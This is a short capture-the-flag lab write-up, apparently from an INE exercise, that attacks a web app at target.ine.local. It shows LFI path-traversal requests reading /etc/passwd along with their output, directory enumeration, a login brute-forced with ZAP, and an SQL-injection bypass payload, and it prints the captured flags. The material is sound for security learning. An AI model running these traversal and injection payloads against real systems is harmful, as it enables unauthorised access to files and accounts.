*domain*:target.ine.local
*ip*:192.10.185.3
*os*:
*attacker ip on interface*:192.10.185.2
**usefull wordlists needed**:
``` shell
/usr/share/wordlists/dirb/common.txt 
/usr/share/seclists/Usernames/top-usernames-shortlist.txt 
/root/Desktop/wordlists/100-common-passwords.txt
```

---
# Web Enumeration

# LFI 
local file inclusion
```shell
'http://target.ine.local/view_file?file=../../../etc/passwd'

	root:x:0:0:root:/root:/bin/bash
	daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
	bin:x:2:2:bin:/bin:/usr/sbin/nologin
	sys:x:3:3:sys:/dev:/usr/sbin/nologin
	sync:x:4:65534:sync:/bin:/bin/sync
	games:x:5:60:games:/usr/games:/usr/sbin/nologin
	man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
	lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
	mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
	news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
	uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
	proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
	www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
	backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
	list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
	irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
	gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
	nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
	_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

# time for flag 1
curl 'http://target.ine.local/view_file?file=../../../../flag.txt'
	FLAG1_da8ef87374cf44e2858f46a98a1c7b0a
```

# Dir enum
directory enumeration
```shell
$ dirsearch -u http://target.ine.local/ -t 25
> [22:39:27] 200 -    3KB - /about                                            
  [22:39:53] 200 -    3KB - /login                                            
  [22:39:53] 302 -  189B  - /logout  ->  /                                    
  [22:40:06] 308 -  251B  - /secured  ->  http://target.ine.local/secured/ 

# misconfigure server
$ curl http://target.ine.local/secured/flag.txt
> FLAG2_be297132d8074fe1a5978ab4a0242ce7
```
# weak creds / bruteforce common username - password

```shell
# burpsuite did not worked because of community restriction
# so use zap
'
-> open zap >  open preconfigure browser > enter $url/login
	> find that url in site box > post request > fuzz > add wordlists
	> boom > 302 found : guest : butterfly1
	'
# login with creds and you got flag 3 : 38e85b167f6f4dfc8cb7be62a111b893
```

# sql injection
```shell
# payload
$ ' OR 1 -- -
$ url: http://target.ine.local/login
# place payload in place of username and place admin in password then login 
FLAG4_993af58481a94df797061df3d165b3ae
```